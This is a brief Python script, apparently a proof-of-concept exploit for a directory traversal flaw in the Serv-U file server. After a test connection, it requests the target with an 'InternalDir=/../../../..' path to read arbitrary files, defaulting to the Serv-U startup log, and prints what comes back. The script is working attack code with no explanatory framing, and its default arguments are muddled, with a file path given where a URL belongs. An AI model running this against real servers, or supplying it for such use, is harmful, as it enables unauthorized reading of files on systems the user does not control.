import requests as r
import argparse as arg
import re

input_user = arg.ArgumentParser()
input_user.add_argument('-t', '--target', help='Enter Target', default='./ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt')
input_user.add_argument('-f', '--file', help='Enter File', default='/ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt')
args = input_user.parse_args()

testing_connection = r.get(f'{args.target}')

if testing_connection.status_code == 200:
    exploit = r.get(f'{args.target}?InternalDir=/../../../..{args.file}')
    cleaned_content = exploit.text.replace('\n', '. ')
    print(cleaned_content)
else:
    print('Connection Failed')
